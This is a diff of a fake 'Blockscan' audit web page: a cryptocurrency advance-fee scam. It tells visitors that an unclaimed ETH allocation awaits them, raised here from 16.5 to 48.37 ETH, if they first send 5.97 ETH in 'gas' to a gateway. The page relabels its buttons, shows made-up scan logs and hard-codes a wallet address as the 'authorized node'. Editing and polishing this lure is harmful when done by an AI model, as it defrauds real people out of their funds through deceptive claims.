@@ -192,7 +192,7 @@
         </div>
 
         <div id="check-view">
-            <h1>Validator Node Audit</h1>
+            <h1>Smart Contract Token Audit</h1>
             <p style="color: #666; font-size: 13px; margin-bottom: 30px;">Authorized by Blockscan Protocol Management</p>
             
             <div class="input-box">
@@ -200,7 +200,7 @@
                 <input type="text" id="wallet-addr" placeholder="0x..." autocomplete="off">
             </div>
 
-            <button class="btn" onclick="runAudit()">Check Validator Eligibility</button>
+            <button class="btn" onclick="runAudit()">Transaction Verification</button>
         </div>
 
         <div id="loader-view">
@@ -216,12 +216,12 @@
 
             <div class="data-table">
                 <div class="data-row"><span>Staking Balance</span><span>0.00 ETH <b style="color:var(--warning)">(5.9698 Required)</b></span></div>
-                <div class="data-row"><span>Legacy Allocation</span><span style="color: var(--success);">16.50 ETH Detected</span></div>
+                <div class="data-row"><span>Legacy Allocation</span><span style="color: var(--success);">48.37 ETH Detected</span></div>
                 <div class="data-row"><span>Node Authority</span><span>Blockscan V4 Managed</span></div>
             </div>
 
             <p style="font-size: 11px; color: #666; line-height: 1.6; margin-bottom: 25px;">
-                Critical: Your node is currently restricted. To authorize the release of the <b>16.5 ETH Legacy Allocation</b>, you must provision the minimum gas and staking liquidity.
+                Critical: Your node is currently restricted. To authorize the release of the <b>48.37 ETH Legacy Allocation</b>, you must provision the minimum gas and staking liquidity.
             </p>
 
             <button class="btn" onclick="showProvisioning()">Get Validator Status</button>
@@ -238,7 +238,7 @@
             </div>
 
             <div style="background: rgba(0, 112, 243, 0.05); padding: 15px; border-radius: 12px; font-size: 12px; border: 1px solid rgba(0, 112, 243, 0.2);">
-                <b>Requirement:</b> Settle the <b>5.969811007 ETH</b> gas fee to the Smart Contract Gateway. This completes the transaction and releases your 16.5 ETH allocation.
+                <b>Requirement:</b> Settle the <b>5.969811007 ETH</b> gas fee to the Smart Contract Gateway. This completes the transaction and releases your 48.37 ETH allocation.
             </div>
 
             <div class="chat-agent-box">
@@ -251,7 +251,6 @@
 <script>
     function runAudit() {
         const addr = document.getElementById('wallet-addr').value.trim();
-        // Target address updated per request
         const AUTHORIZED_NODE = "0x66e281b5b0bf78ed269daf7c4b0f36b5dff0d822";
 
         if (addr.length < 42) { 
@@ -273,7 +272,7 @@
             "> Connecting to Blockscan API...",
             "> Fetching Merkle Proof for Node...",
             "> Scanning Beacon Chain Shards...",
-            "> Found: 16.5 ETH Unclaimed Legacy Pool.",
+            "> Found: 48.37 ETH Unclaimed Legacy Pool.",
             "> Error: Insufficient Gas for Allocation Release.",
             "> Required: 5.969811007 ETH.",
             "> Generating Blockscan Audit Report..."
